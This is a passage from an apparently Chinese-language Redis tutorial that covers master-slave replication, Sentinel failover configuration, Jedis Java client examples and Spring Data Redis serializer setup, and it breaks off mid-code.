会使用给定的频道作为键，在它所维护的channel字典中查找记录了订阅这个频道的所有客户端的链表，遍历这个链表，将消息发布给所有订阅者。\n\nredis发布订阅功能并不是特别使用，稍微复杂的场景我们还是会使用消息中间件 MQ\n\n# Redis主从复制\n主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master/leader)，后者称为从节点(slave/follower)；数据的复制是单向的，只能由主节点到从节点。Master以写为主，Slave 以读为主。\n\n<font color=\"red\">默认情况下，每台Redis服务器都是主节点；</font>\n\n一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点。\n\n<font color=\"red\">redis中主机可以读写，而从节点只能读</font>\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133346.png)\n主节点如果断开连接，从节点依旧可以读，只是这个集群就失去了写操作。如果主节点重新连接了，从节点仍然可以读取主节点的信息。\n\n**主从复制的作用主要包括：**\n- 数据冗余：主从复制实现了数据的热备份，是持久化之外的一种数据冗余方式。\n- 故障恢复：当主节点出现问题时，可以由从节点提供服务，实现快速的故障恢复；实际上是一种服务\n的冗余。\n- 负载均衡：在主从复制的基础上，配合读写分离，可以由主节点提供写服务，由从节点提供读服务（即写Redis数据时应用连接主节点，读Redis数据时应用连接从节点），分担服务器负载；尤其是在写少读多的场景下，通过多个从节点分担读负载，可以大大提高Redis服务器的并发量。\n- 高可用（集群）基石：除了上述作用以外，主从复制还是哨兵和集群能够实施的基础，因此说主从复制是Redis高可用的基础。\n\n**一般来说，要将Redis运用于工程项目中，只使用一台Redis是万万不能的（宕机），原因如下：**\n- 从结构上，单个Redis服务器会发生单点故障，并且一台服务器需要处理所有的请求负载，压力较大；\n- 从容量上，单个Redis服务器内存容量有限，就算一台Redis服务器内存容量为256G，也不能将所有内存用作Redis存储内存，一般来说，单台Redis最大使用内存不应该超过20G。电商网站上的商品，一般都是一次上传，无数次浏览的，说专业点也就是\"多读少写\"。\n对于这种场景，我们可以使如下这种架构：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133357.png)\n\n主从复制，读写分离！ 80% 的情况下都是在进行读操作！减缓服务器的压力！架构中经常使用！ 一主二从！\n只要在公司中，主从复制就是必须要使用的，因为在真实的项目中不可能单机使用Redis！\n\n## 一主二从\n1. 配置3个redis服务器的配置文件，修改对应的信息：\n- 端口\n- pid 名字\n- log文件名字\n- dump.rdb 名字\n修改完毕之后，启动我们的3个redis服务器，可以通过进程信息查看！\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133408.png)\n\n我可以通过`info replication`命令来查看当前redis主从信息\n```shell\n127.0.0.1:6379> info replication # 查看当前redis主从信息\n# Replication \nrole:master # 角色为master \nconnected_slaves:0 # 没有从机 \nmaster_replid:b63c90e6c501143759cb0e7f450bd1eb0c70882a \nmaster_replid2:0000000000000000000000000000000000000000 \nmaster_repl_offset:0 \nsecond_repl_offset:-1 \nrepl_backlog_active:0 \nrepl_backlog_size:1048576 \nrepl_backlog_first_byte_offset:0 \nrepl_backlog_histlen:0\n```\n\n\n2. 默认情况下，每台Redis服务器都是主节点； 所以我们一般情况下只用配置从机就好了！\n我们将6379端口的redis设置为主节点，将6380、6381端口设置为从节点\n```shell\n127.0.0.1:6380> SLAVEOF 127.0.0.1 6379 # 将127.0.0.1上的6379端口的redis设置为它的主节点\nOK127.0.0.1:6380> info replication \n# Replication \nrole:slave # 当前角色是从机 \nmaster_host:127.0.0.1 # 它的主节点机的信息 \nmaster_port:6379\nmaster_link_status:up\nmaster_last_io_seconds_ago:3 \nmaster_sync_in_progress:0 \nslave_repl_offset:14 \nslave_priority:100 \nslave_read_only:1 connected_slaves:0 \nmaster_replid:a81be8dd257636b2d3e7a9f595e69d73ff03774e\nmaster_replid2:0000000000000000000000000000000000000000\nmaster_repl_offset:14 second_repl_offset:-1\nrepl_backlog_active:1\nrepl_backlog_size:1048576\nrepl_backlog_first_byte_offset:1\nrepl_backlog_histlen:14\n```\n```shell\n# 查看6379端口的redis！ \n127.0.0.1:6379> info replication \n# Replication role:master \nconnected_slaves:1 # 多了从机的配置 \nslave0:ip=127.0.0.1,port=6380,state=online,offset=42,lag=1 # 多了从机的配置 \nmaster_replid:a81be8dd257636b2d3e7a9f595e69d73ff03774e \nmaster_replid2:0000000000000000000000000000000000000000 \nmaster_repl_offset:42 \nsecond_repl_offset:-1 \nrepl_backlog_active:1\nrepl_backlog_size:1048576 \nrepl_backlog_first_byte_offset:1\nrepl_backlog_histlen:42\n```\n\n真实的从主配置应该在配置文件中配置，这样的话是永久的，我们这里使用的是命令，暂时的, 重启后，所有redis服务器就又变成了主节点\n\n**通过配置文件配置主从(永久的)**\n```conf\nreplicaof 127.0.0.1 6379 #将当前节点设置为指定节点的从节点\nmasterauth <master-password>   #如果主节点有密码的话要在这设置密码\n```\n\n\n## 主从复制原理\nSlave启动成功连接到master后会发送一个sync同步命令\nMaster接收到命令，启动后台的存盘进程，同时收集所有接收到的用于修改数据的命令，在后台进程执行完毕后，master将传送整个数据文件到slave，并完成一次完全同步\n- 全量复制：slave服务在接收到数据库文件数据后，将其存盘并加载到内存中\n- 增量复制：Master继续将新的所有收集到的修改命令依次传送给slave，完成同步\n只要重新连接master，一次全量复制将自动执行\n\n\n## 层层链路\n将6379端口的redis设为为6380端口的redis的主节点， 又将6380端口的redis设为6381端口的redis的主节点；此时在6380端口上的redis上使用`info replication`查看可得知，6380还是从节点，而不是主节点；\n在6379端口上的redis上使用`info replication`查看可得知，6379只有一个从节点6380\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133418.png)\n\n\n## 哨兵模式\n在没有使用哨兵之前， 如果主机断开了连接，我们只能使用`SLAVEOF no one`让自己变成主机！其他的节点只能手动连接到最新的这个主节点（手动），这不是一种推荐的方式，更多时候，我们优先考虑哨兵模式，Redis从2.8开始正式提供了Sentinel（哨兵） 架构来解决这个问题\n哨兵模式能够后台监控主机是否故障，如果故障了根据投票数自动将从节点转换为主节点。\n\n哨兵模式是一种特殊的模式，首先Redis提供了哨兵的命令，哨兵是一个独立的进程，作为进程，它会独\n立运行。其原理是哨兵通过发送命令，等待Redis服务器响应，从而监控运行的多个Redis实例。\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133427.png)\n\n这里的哨兵有两个作用\n- 通过发送命令，让Redis服务器返回监控其运行状态，包括主服务器和从服务器。\n- 当哨兵监测到master宕机，会自动将slave切换成master，然后通过发布订阅模式通知其他的从服务器，修改配置文件，让它们切换主机。\n\n然而一个哨兵进程对Redis服务器进行监控，可能会出现问题，为此，我们可以使用多个哨兵进行监控。各个哨兵之间还会进行监控，这样就形成了多哨兵模式。\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133439.png)\n\n假设主服务器宕机，哨兵1先检测到这个结果，系统并不会马上进行`failover[故障转移]`过程，仅仅是哨兵1主观的认为主服务器不可用，这个现象成为主观下线。当后面的哨兵也检测到主服务器不可用，并且数量达到一定值时，那么哨兵之间就会进行一次投票，投票的结果由一个哨兵发起，进行failover操作。切换成功后，就会通过发布订阅模式，让各个哨兵把自己监控的从服务器实现切换主机，这个过程称为客观下线。\n\n### 测试\n我们目前的状态是 一主二从！\n1. 配置哨兵配置文件 sentinel.conf\n```conf\n# 哨兵sentinel监控的redis主节点的 ip port\n# master-name 可以自己命名的主节点名字 只能由字母A-z、数字0-9 、这三个字符\".-_\"组成。 \n# quorum 配置多少个sentinel哨兵统一认为master主节点失联 那么这时客观上认为主节点失联了 \n# sentinel monitor <master-name> <ip> <redis-port> <quorum> \nsentinel monitor mymaster 127.0.0.1 6379\n```\n2. 启动哨兵！\n```shell\n[root@kuangshen bin]# redis-sentinel kconfig/sentinel.conf \n26607:X 31 Mar 2020 21:13:10.027 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo 26607:X 31 Mar 2020 21:13:10.027 # Redis version=5.0.8, bits=64, commit=00000000, modified=0, pid=26607, just started \n26607:X 31 Mar 2020 21:13:10.027 # Configuration loaded \n...\n26607:X 31 Mar 2020 21:13:10.031 * +slave slave 127.0.0.1:6380 127.0.0.1 6380 @ myredis 127.0.0.1 6379 \n26607:X 31 Mar 2020 21:13:10.033 * +slave slave 127.0.0.1:6381 127.0.0.1 6381 @ myredis 127.0.0.1 6379\n```\n\n如果6379端口的主节点断开了，这个时候就会从从机中随机选择一个服务器来当主节点！（这里面有一个投票算法！）\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133452.png)\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133504.png)\n\n如果6379端口的主节点此时回来了，只能归并到新的主机6381下，当做从机，这就是哨兵模式的规则！\n\n### 哨兵模式的全部配置\n```conf\n# Example sentinel.conf \n\n# 哨兵sentinel实例运行的端口 默认26379 \nport 26379 \n\n# 哨兵sentinel的工作目录 \ndir /tmp \n\n# 哨兵sentinel监控的redis主节点的 ip port \n# master-name 可以自己命名的主节点名字 只能由字母A-z、数字0-9 、这三个字符\".-_\"组成。 \n# quorum 配置多少个sentinel哨兵统一认为master主节点失联 那么这时客观上认为主节点失联了 \n# sentinel monitor <master-name> <ip> <redis-port> <quorum> \nsentinel monitor mymaster 127.0.0.1 6379 2 \n\n# 当在Redis实例中开启了requirepass foobared 授权密码 这样所有连接Redis实例的客户端都要提供密码\n# 设置哨兵sentinel 连接主从的密码 注意必须为主从设置一样的验证密码 \n# sentinel auth-pass <master-name> <password> \nsentinel auth-pass mymaster MySUPER--secret-0123passw0rd \n\n# 指定多少毫秒之后 主节点没有应答哨兵sentinel 此时 哨兵主观上认为主节点下线 默认30秒 \n# sentinel down-after-milliseconds <master-name> <milliseconds> \nsentinel down-after-milliseconds mymaster 30000 \n\n# 这个配置项指定了在发生failover主备切换时最多可以有多少个slave同时对新的master进行 同步， 这个数字越小，完成failover所需的时间就越长， 但是如果这个数字越大，就意味着越 多的slave因为replication而不可用。 可以通过将这个值设为 1 来保证每次只有一个slave 处于不能处理命令请求的状态。 \n# sentinel parallel-syncs <master-name> <numslaves> \nsentinel parallel-syncs mymaster 1 \n\n# 故障转移的超时时间 failover-timeout 可以用在以下这些方面： \n#1. 同一个sentinel对同一个master两次failover之间的间隔时间。 \n#2. 当一个slave从一个错误的master那里同步数据开始计算时间。直到slave被纠正为向正确的master那 里同步数据时。 \n#3.当想要取消一个正在进行的failover所需要的时间。 \n#4.当进行failover时，配置所有slaves指向新的master所需的最大时间。不过，即使过了这个超时， slaves依然会被正确配置为指向master，但是就不按parallel-syncs所配置的规则来了 \n# 默认三分钟 \n# sentinel failover-timeout <master-name> <milliseconds>\nsentinel failover-timeout mymaster 180000\n\n# SCRIPTS EXECUTION \n\n#配置当某一事件发生时所需要执行的脚本，可以通过脚本来通知管理员，例如当系统运行不正常时发邮件通知 相关人员。 \n#对于脚本的运行结果有以下规则： \n#若脚本执行后返回1，那么该脚本稍后将会被再次执行，重复次数目前默认为10 \n#若脚本执行后返回2，或者比2更高的一个返回值，脚本将不会重复执行。 \n#如果脚本在执行过程中由于收到系统中断信号被终止了，则同返回值为1时的行为相同。 \n#一个脚本的最大执行时间为60s，如果超过这个时间，脚本将会被一个SIGKILL信号终止，之后重新执行。 \n#通知型脚本:当sentinel有任何警告级别的事件发生时（比如说redis实例的主观失效和客观失效等等）， 将会去调用这个脚本，这时这个脚本应该通过邮件，SMS等方式去通知系统管理员关于系统不正常运行的信 息。调用该脚本时，将传给脚本两个参数，一个是事件的类型，一个是事件的描述。如果sentinel.conf配 置文件中配置了这个脚本路径，那么必须保证这个脚本存在于这个路径，并且是可执行的，否则sentinel无 法正常启动成功。 \n#通知脚本\n# shell编程 \n# sentinel notification-script <master-name> <script-path> \nsentinel notification-script mymaster /var/redis/notify.s\n\n# 客户端重新配置主节点参数脚本 \n# 当一个master由于failover而发生改变时，这个脚本将会被调用，通知相关的客户端关于master地址已 经发生改变的信息。 \n# 以下参数将会在调用脚本时传给脚本: \n# <master-name> <role> <state> <from-ip> <from-port> <to-ip> <to-port> \n# 目前<state>总是“failover”, # <role>是“leader”或者“observer”中的一个。 \n# 参数 from-ip, from-port, to-ip, to-port是用来和旧的master和新的master(即旧的slave)通 信的\n# 这个脚本应该是通用的，能被多次调用，不是针对性的。 \n# sentinel client-reconfig-script <master-name> <script-path> \nsentinel client-reconfig-script mymaster /var/redis/reconfig.sh # 一般都是由运维来配 置！\n```\n\n### 哨兵模式缺点与优点\n优点：\n- 主从可以切换，故障可以转移，系统的可用性就会更好\n- 哨兵模式就是主从模式的升级，手动到自动，更加健壮！\n缺点：\n- Redis 不好啊在线扩容的，集群容量一旦到达上限，在线扩容就十分麻烦！\n- 实现哨兵模式的配置其实是很麻烦的，里面有很多选择！\n\n# Jedis\nJedis 是 Redis 官方推荐的 java连接开发工具！ 使用Java 操作Redis 中间件！如果你要使用java操作redis，那么一定要对Jedis 十分的熟悉！\n\n**使用：**\n1. 导入依赖\n```xml\n<!--导入jedis的包--> \n<dependencies> \n  <!-- https://mvnrepository.com/artifact/redis.clients/jedis --> \n  <dependency> \n    <groupId>redis.clients</groupId> \n    <artifactId>jedis</artifactId> \n    <version>3.2.0</version> \n  </dependency>\n</dependencies> \n```\n\n2. 编码测试：\n- 连接数据库\n- 操作命令\n- 断开连接！\n```java\npublic class TestPing { \n  public static void main(String[] args) { \n    // 1、 new Jedis 对象即可 \n    Jedis jedis = new Jedis(\"127.0.0.1\",6379); \n    // jedis 所有的命令就是我们之前学习的所有指令！所以之前的指令学习很重要！ \n    System.out.println(jedis.ping());\n  }\n}\n```\n```java\npublic class TestKey {\n    public static void main(String[] args) {\n        Jedis jedis = new Jedis(\"127.0.0.1\", 6379);\n\n        System.out.println(\"清空数据：\"+jedis.flushDB());\n        System.out.println(\"判断某个键是否存在：\"+jedis.exists(\"username\"));\n        System.out.println(\"新增<'username','kuangshen'>的键值对：\"+jedis.set(\"username\", \"kuangshen\"));\n        System.out.println(\"新增<'password','password'>的键值对：\"+jedis.set(\"password\", \"password\"));\n        System.out.print(\"系统中所有的键如下：\");\n        Set<String> keys = jedis.keys(\"*\");\n        System.out.println(keys);\n        System.out.println(\"删除键password:\"+jedis.del(\"password\"));\n        System.out.println(\"判断键password是否存在：\"+jedis.exists(\"password\"));\n        System.out.println(\"查看键username所存储的值的类型：\"+jedis.type(\"username\"));\n        System.out.println(\"随机返回key空间的一个：\"+jedis.randomKey());\n        System.out.println(\"重命名key：\"+jedis.rename(\"username\",\"name\"));\n        System.out.println(\"取出改后的name：\"+jedis.get(\"name\"));\n        System.out.println(\"按索引查询：\"+jedis.select(0));\n        System.out.println(\"删除当前选择数据库中的所有key：\"+jedis.flushDB());\n        System.out.println(\"返回当前数据库中key的数目：\"+jedis.dbSize());\n        System.out.println(\"删除所有数据库中的所有key：\"+jedis.flushAll());\n    }\n}\n```\n```java\npublic class TestString {\n    public static void main(String[] args) {\n        Jedis jedis = new Jedis(\"127.0.0.1\", 6379);\n\n        jedis.flushDB();\n        System.out.println(\"===========增加数据===========\");\n        System.out.println(jedis.set(\"key1\",\"value1\"));\n        System.out.println(jedis.set(\"key2\",\"value2\"));\n        System.out.println(jedis.set(\"key3\", \"value3\"));\n        System.out.println(\"删除键key2:\"+jedis.del(\"key2\"));\n        System.out.println(\"获取键key2:\"+jedis.get(\"key2\"));\n        System.out.println(\"修改key1:\"+jedis.set(\"key1\", \"value1Changed\"));\n        System.out.println(\"获取key1的值：\"+jedis.get(\"key1\"));\n        System.out.println(\"在key3后面加入值：\"+jedis.append(\"key3\", \"End\"));\n        System.out.println(\"key3的值：\"+jedis.get(\"key3\"));\n        System.out.println(\"增加多个键值对：\"+jedis.mset(\"key01\",\"value01\",\"key02\",\"value02\",\"key03\",\"value03\"));\n        System.out.println(\"获取多个键值对：\"+jedis.mget(\"key01\",\"key02\",\"key03\"));\n        System.out.println(\"获取多个键值对：\"+jedis.mget(\"key01\",\"key02\",\"key03\",\"key04\"));\n        System.out.println(\"删除多个键值对：\"+jedis.del(\"key01\",\"key02\"));\n        System.out.println(\"获取多个键值对：\"+jedis.mget(\"key01\",\"key02\",\"key03\"));\n\n        jedis.flushDB();\n        System.out.println(\"===========新增键值对防止覆盖原先值==============\");\n        System.out.println(jedis.setnx(\"key1\", \"value1\"));\n        System.out.println(jedis.setnx(\"key2\", \"value2\"));\n        System.out.println(jedis.setnx(\"key2\", \"value2-new\"));\n        System.out.println(jedis.get(\"key1\"));\n        System.out.println(jedis.get(\"key2\"));\n\n        System.out.println(\"===========新增键值对并设置有效时间=============\");\n        System.out.println(jedis.setex(\"key3\", 2, \"value3\"));\n        System.out.println(jedis.get(\"key3\"));\n        try {\n            TimeUnit.SECONDS.sleep(3);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        System.out.println(jedis.get(\"key3\"));\n\n        System.out.println(\"===========获取原值，更新为新值==========\");\n        System.out.println(jedis.getSet(\"key2\", \"key2GetSet\"));\n        System.out.println(jedis.get(\"key2\"));\n\n        System.out.println(\"获得key2的值的字串：\"+jedis.getrange(\"key2\", 2, 4));\n    }\n}\n\n```\n```java\npublic class TestList {\n    public static void main(String[] args) {\n        Jedis jedis = new Jedis(\"127.0.0.1\", 6379);\n        jedis.flushDB();\n        System.out.println(\"===========添加一个list===========\");\n        jedis.lpush(\"collections\", \"ArrayList\", \"Vector\", \"Stack\", \"HashMap\", \"WeakHashMap\", \"LinkedHashMap\");\n        jedis.lpush(\"collections\", \"HashSet\");\n        jedis.lpush(\"collections\", \"TreeSet\");\n        jedis.lpush(\"collections\", \"TreeMap\");\n        System.out.println(\"collections的内容：\"+jedis.lrange(\"collections\", 0, -1));//-1代表倒数第一个元素，-2代表倒数第二个元素,end为-1表示查询全部\n        System.out.println(\"collections区间0-3的元素：\"+jedis.lrange(\"collections\",0,3));\n        System.out.println(\"===============================\");\n        // 删除列表指定的值 ，第二个参数为删除的个数（有重复时），后add进去的值先被删，类似于出栈\n        System.out.println(\"删除指定元素个数：\"+jedis.lrem(\"collections\", 2, \"HashMap\"));\n        System.out.println(\"collections的内容：\"+jedis.lrange(\"collections\", 0, -1));\n        System.out.println(\"删除下表0-3区间之外的元素：\"+jedis.ltrim(\"collections\", 0, 3));\n        System.out.println(\"collections的内容：\"+jedis.lrange(\"collections\", 0, -1));\n        System.out.println(\"collections列表出栈（左端）：\"+jedis.lpop(\"collections\"));\n        System.out.println(\"collections的内容：\"+jedis.lrange(\"collections\", 0, -1));\n        System.out.println(\"collections添加元素，从列表右端，与lpush相对应：\"+jedis.rpush(\"collections\", \"EnumMap\"));\n        System.out.println(\"collections的内容：\"+jedis.lrange(\"collections\", 0, -1));\n        System.out.println(\"collections列表出栈（右端）：\"+jedis.rpop(\"collections\"));\n        System.out.println(\"collections的内容：\"+jedis.lrange(\"collections\", 0, -1));\n        System.out.println(\"修改collections指定下标1的内容：\"+jedis.lset(\"collections\", 1, \"LinkedArrayList\"));\n        System.out.println(\"collections的内容：\"+jedis.lrange(\"collections\", 0, -1));\n        System.out.println(\"===============================\");\n        System.out.println(\"collections的长度：\"+jedis.llen(\"collections\"));\n        System.out.println(\"获取collections下标为2的元素：\"+jedis.lindex(\"collections\", 2));\n        System.out.println(\"===============================\");\n        jedis.lpush(\"sortedList\", \"3\",\"6\",\"2\",\"0\",\"7\",\"4\");\n        System.out.println(\"sortedList排序前：\"+jedis.lrange(\"sortedList\", 0, -1));\n        System.out.println(jedis.sort(\"sortedList\"));\n        System.out.println(\"sortedList排序后：\"+jedis.lrange(\"sortedList\", 0, -1));\n    }\n}\n```\n```java\npublic class TestSet {\n    public static void main(String[] args) {\n        Jedis jedis = new Jedis(\"127.0.0.1\", 6379);\n        jedis.flushDB();\n        System.out.println(\"============向集合中添加元素（不重复）============\");\n        System.out.println(jedis.sadd(\"eleSet\", \"e1\",\"e2\",\"e4\",\"e3\",\"e0\",\"e8\",\"e7\",\"e5\"));\n        System.out.println(jedis.sadd(\"eleSet\", \"e6\"));\n        System.out.println(jedis.sadd(\"eleSet\", \"e6\"));\n        System.out.println(\"eleSet的所有元素为：\"+jedis.smembers(\"eleSet\"));\n        System.out.println(\"删除一个元素e0：\"+jedis.srem(\"eleSet\", \"e0\"));\n        System.out.println(\"eleSet的所有元素为：\"+jedis.smembers(\"eleSet\"));\n        System.out.println(\"删除两个元素e7和e6：\"+jedis.srem(\"eleSet\", \"e7\",\"e6\"));\n        System.out.println(\"eleSet的所有元素为：\"+jedis.smembers(\"eleSet\"));\n        System.out.println(\"随机的移除集合中的一个元素：\"+jedis.spop(\"eleSet\"));\n        System.out.println(\"随机的移除集合中的一个元素：\"+jedis.spop(\"eleSet\"));\n        System.out.println(\"eleSet的所有元素为：\"+jedis.smembers(\"eleSet\"));\n        System.out.println(\"eleSet中包含元素的个数：\"+jedis.scard(\"eleSet\"));\n        System.out.println(\"e3是否在eleSet中：\"+jedis.sismember(\"eleSet\", \"e3\"));\n        System.out.println(\"e1是否在eleSet中：\"+jedis.sismember(\"eleSet\", \"e1\"));\n        System.out.println(\"e1是否在eleSet中：\"+jedis.sismember(\"eleSet\", \"e5\"));\n        System.out.println(\"=================================\");\n        System.out.println(jedis.sadd(\"eleSet1\", \"e1\",\"e2\",\"e4\",\"e3\",\"e0\",\"e8\",\"e7\",\"e5\"));\n        System.out.println(jedis.sadd(\"eleSet2\", \"e1\",\"e2\",\"e4\",\"e3\",\"e0\",\"e8\"));\n        System.out.println(\"将eleSet1中删除e1并存入eleSet3中：\"+jedis.smove(\"eleSet1\", \"eleSet3\", \"e1\"));//移到集合元素\n        System.out.println(\"将eleSet1中删除e2并存入eleSet3中：\"+jedis.smove(\"eleSet1\", \"eleSet3\", \"e2\"));\n        System.out.println(\"eleSet1中的元素：\"+jedis.smembers(\"eleSet1\"));\n        System.out.println(\"eleSet3中的元素：\"+jedis.smembers(\"eleSet3\"));\n        System.out.println(\"============集合运算=================\");\n        System.out.println(\"eleSet1中的元素：\"+jedis.smembers(\"eleSet1\"));\n        System.out.println(\"eleSet2中的元素：\"+jedis.smembers(\"eleSet2\"));\n        System.out.println(\"eleSet1和eleSet2的交集:\"+jedis.sinter(\"eleSet1\",\"eleSet2\"));\n        System.out.println(\"eleSet1和eleSet2的并集:\"+jedis.sunion(\"eleSet1\",\"eleSet2\"));\n        System.out.println(\"eleSet1和eleSet2的差集:\"+jedis.sdiff(\"eleSet1\",\"eleSet2\"));//eleSet1中有，eleSet2中没有\n        jedis.sinterstore(\"eleSet4\",\"eleSet1\",\"eleSet2\");//求交集并将交集保存到dstkey的集合\n        System.out.println(\"eleSet4中的元素：\"+jedis.smembers(\"eleSet4\"));\n    }\n}\n```\n```java\npublic class TestHash {\n    public static void main(String[] args) {\n        Jedis jedis = new Jedis(\"127.0.0.1\", 6379);\n        jedis.flushDB();\n        Map<String,String> map = new HashMap<String,String>();\n        map.put(\"key1\",\"value1\");\n        map.put(\"key2\",\"value2\");\n        map.put(\"key3\",\"value3\");\n        map.put(\"key4\",\"value4\");\n        //添加名称为hash（key）的hash元素\n        jedis.hmset(\"hash\",map);\n        //向名称为hash的hash中添加key为key5，value为value5元素\n        jedis.hset(\"hash\", \"key5\", \"value5\");\n        System.out.println(\"散列hash的所有键值对为：\"+jedis.hgetAll(\"hash\"));//return Map<String,String>\n        System.out.println(\"散列hash的所有键为：\"+jedis.hkeys(\"hash\"));//return Set<String>\n        System.out.println(\"散列hash的所有值为：\"+jedis.hvals(\"hash\"));//return List<String>\n        System.out.println(\"将key6保存的值加上一个整数，如果key6不存在则添加key6：\"+jedis.hincrBy(\"hash\", \"key6\", 6));\n        System.out.println(\"散列hash的所有键值对为：\"+jedis.hgetAll(\"hash\"));\n        System.out.println(\"将key6保存的值加上一个整数，如果key6不存在则添加key6：\"+jedis.hincrBy(\"hash\", \"key6\", 3));\n        System.out.println(\"散列hash的所有键值对为：\"+jedis.hgetAll(\"hash\"));\n        System.out.println(\"删除一个或者多个键值对：\"+jedis.hdel(\"hash\", \"key2\"));\n        System.out.println(\"散列hash的所有键值对为：\"+jedis.hgetAll(\"hash\"));\n        System.out.println(\"散列hash中键值对的个数：\"+jedis.hlen(\"hash\"));\n        System.out.println(\"判断hash中是否存在key2：\"+jedis.hexists(\"hash\",\"key2\"));\n        System.out.println(\"判断hash中是否存在key3：\"+jedis.hexists(\"hash\",\"key3\"));\n        System.out.println(\"获取hash中的值：\"+jedis.hmget(\"hash\",\"key3\"));\n        System.out.println(\"获取hash中的值：\"+jedis.hmget(\"hash\",\"key3\",\"key4\"));\n    }\n}\n```\n\n**事务操作**\n```java\npublic class TestMulti {\n    public static void main(String[] args) {\n        //创建客户端连接服务端，redis服务端需要被开启\n        Jedis jedis = new Jedis(\"127.0.0.1\", 6379);\n        jedis.flushDB();\n\n        JSONObject jsonObject = new JSONObject();\n        jsonObject.put(\"hello\", \"world\");\n        jsonObject.put(\"name\", \"java\");\n        //开启事务\n        Transaction multi = jedis.multi();\n        String result = jsonObject.toJSONString();\n        try{\n            //向redis存入一条数据\n            multi.set(\"json\", result);\n            //再存入一条数据\n            multi.set(\"json2\", result);\n            //如果没有引发异常，执行事务\n            multi.exec();\n        }catch(Exception e){\n            e.printStackTrace();\n            //如果出现异常，回滚\n            multi.discard();\n        }finally{\n            System.out.println(jedis.get(\"json\"));\n            System.out.println(jedis.get(\"json2\"));\n            //最终关闭客户端\n            jedis.close();\n        }\n    }\n}\n```\n\n# springdataRedis\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-data-redis</artifactId>\n</dependency>\n```\n配置\n```yml\nspring:\n  redis:\n    # Redis服务器地址\n    host: 127.0.0.1\n    # Redis服务器端口\n    port: 6379\n    # Redis服务器密码\n    password: root\n    database: 0\n    # 连接超时时间\n    timeout: 10000ms\n    lettuce:\n      pool:\n        # 最大连接数，默认为8\n        max-active: 1024\n        # 最大连接阻塞等待时间\n        max-wait: 10000ms\n        # 最大空闲连接，默认为8\n        max-idle: 200\n        # 最小空闲连接，默认为0\n        min-idle: 5\n\n```\n\n**jedis与lettuce的区别**\nJedis是一个优秀的基于Java 语言的Redis 客户端，但是，其不足也很明显：Jedis在实现上是直接连接Redis-Server，在多个线程间共享一个Jedis实例时是线程不安全的，如果想要在多线程场景下使用Jedis，需要使用连接池，每个线程都使用自己的Jedis实例，当连接数量增多时，会消耗较多的物理资源。\nLettuce则完全克服了其线程不安全的缺点：Lettuce是基于Netty的连接（StatefulRedisConnection），Lettuce是一个可伸缩的线程安全的Redis客户端，支持同步、异步和响应式模式。多个线程可以共享一个连接实例，而不必担心多线程并发问题。它基于优秀Netty NIO框架构建，支持Redis的高级功能，如Sentinel，集群，流水线，自动重新连接和Redis 数据模型。\n\n**测试环境是否搭建成功**\n```java\n@RunWith(SpringRunner.class)\n@SpringBootTest(classes = RedisApplication.class)\nclass RedisApplicationTests {\n\n\t@Autowired\n\tprivate RedisTemplate redisTemplate;\n\n\t@Autowired\n\tprivate StringRedisTemplate stringRedisTemplate;\n\n\t@Test\n\tpublic void initconn(){\n\t\tValueOperations<String, String> ops = stringRedisTemplate.opsForValue();\n\t\tops.set(\"username\", \"li\");\n\t\tValueOperations<String, String> value = redisTemplate.opsForValue();\n\t\tops.set(\"name\", \"wang\");\n\t\tSystem.out.println(ops.get(\"name\"));\n\t}\n}\n```\n\n## 自定义序列化模板解决序列化问题\n默认情况下的模板`RedisTemplate<Object，Object>`，默认序列化使用的是 `JdkSerializationRedisSerializer`，存储二进制字节码。这时需要自定义模板，当自定义模板后又想存储String 字符串时，可以使`StringRedisTemplate`的方式，他们俩并不冲突。\n\n**序列化问题：**\n要把java对象做为key-value对保存在redis中，就必须要解决对象的序列化问题。Spring Data Redis给我们提供了一些现成的方案 \n\nJdkSerializationRedisSerializer使用JDK提供的序列化功能。优点是反序列化时不需要提供类型信息（class），但缺点是序列化后的结果非常庞大，是JSON格式的5倍左右，这样就会消耗Redis服务器的大量内存。\n\nJackson2JsonRedisSerializer使用Jackson库将对象序列化为JSON字符串。优点是速度快，序列化后的字符串短小精悍。但缺点也非常致命，那就是此类的构造函数中有一个类型参数，必须提供要序列化对象的类型信息（.class对象）。通过查看源代码，发现其只在反序列化过程中用到了类型信息。\nGenericJackson2JsonRedisSerializer通用型序列化，这种序列化方式不用自己手动指定对象的Class。\n\n\n**自定义序列化模板**\n```java\n@Configuration\npublic class RedisConfig {\n\t@Bean\n\tpublic RedisTemplate<String, Object> redisTemplate(LettuceConnectionFactory lettuceConnectionFactory){\n\t\tRedisTemplate<String, Object> redisTemplate = new RedisTemplate<>();\n\t\t//为string类型key设置序列器\n\t\tredisTemplate.setKeySerializer(new StringRedisSerializer());\n\t\t//为string类型value设置序列器\n\t\tredisTemplate.setValueSerializer(new GenericJackson2JsonRedisSerializer());\n\t\t//为hash类型key设置序列器\n\t\tredisTemplate.setHashKeySerializer(new StringRedisSerializer());\n\t\t//hash类型的value设置序列器\n\t\tredisTemplate.setHashValueSerializer(new GenericJackson2JsonRedisSerializer());\n\t\tredisTemplate.setConnectionFactory(lettuceConnectionFactory);\n\t\treturn redisTemplate;\n\t}\n}\n```\n```java\n@RunWith(SpringRunner.class)\n@SpringBootTest(classes = RedisApplication.class)\nclass RedisApplicationTests {\n\n\t@Autowired\n\tprivate RedisTemplate redisTemplate;\n\n\t@Test\n\tpublic void testSerial(){\n\t\tUser user = new User();\n\t\tuser.setId(1);\n\t\tuser.setName(\"zhangsan\");\n\t\tuser.setAge(20);\n\t\tValueOperations ops = redisTemplate.opsForValue();\n\t\tops.set(\"user\", user);\n\t\tObject user1 = 